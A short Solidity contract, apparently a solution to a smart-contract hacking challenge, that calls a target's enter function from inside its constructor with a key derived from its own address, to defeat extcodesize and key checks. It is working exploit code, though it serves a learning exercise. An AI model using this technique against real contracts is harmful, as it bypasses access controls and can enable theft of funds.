pragma solidity ^0.8.0;

contract Hack{

    constructor(address add) public {
        uint64 key;
        key = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes memory data = abi.encodeWithSignature("enter(bytes8)",bytes8(key));
        (bool success, ) = add.call(data);
        require(success);
    }
}

// 考察extcodesize无法计算位于constructor中的代码大小